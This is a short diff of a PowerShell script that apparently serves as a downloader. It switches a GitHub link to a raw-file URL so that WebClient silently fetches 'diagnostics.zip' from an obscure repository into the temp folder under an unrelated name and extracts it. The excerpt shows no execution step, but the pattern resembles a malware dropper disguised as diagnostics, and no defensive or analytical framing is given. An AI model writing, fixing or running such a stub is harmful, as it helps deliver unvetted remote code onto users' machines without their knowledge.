@@ -1,5 +1,5 @@
 $webClient = New-Object System.Net.webClient
-$url1 = "https://github.com/sympathetic-lama/1m/blob/main/diagnostics.zip"
+$url1 = "https://github.com/sympathetic-lama/1m/raw/refs/heads/main/diagnostics.zip"
 $zipPath1 = "$env:TEMP\prague1.zip"
 $webClient.DownloadFile($url1, $zipPath1)
 $extractPath1 = "$env:TEMP\file"
